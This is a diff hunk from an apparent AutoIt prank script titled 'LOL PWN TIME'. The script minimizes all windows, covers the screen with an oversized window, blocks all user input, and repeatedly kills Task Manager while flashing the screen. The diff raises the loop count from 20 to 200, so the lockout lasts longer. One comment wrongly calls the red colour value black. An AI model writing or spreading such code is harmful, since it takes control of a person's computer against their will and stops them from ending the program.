@@ -14,7 +14,7 @@ WinMinimizeAll() ; minimize all other windows
 GUICreate("LOL PWN TIME", 4000, 4000) ; create the GUI overlay for the screen
 BlockInput(1) ; block all user input
 
-while $loop < 20 ;controls how many times the screen flashes along with line 26
+while $loop < 200 ;controls how many times the screen flashes along with line 26
    ProcessClose("taskmgr.exe")
    GUISetState(@SW_SHOW) ;show the GUI
    GUISetBkColor(0xFF0000) ;set the colour to black
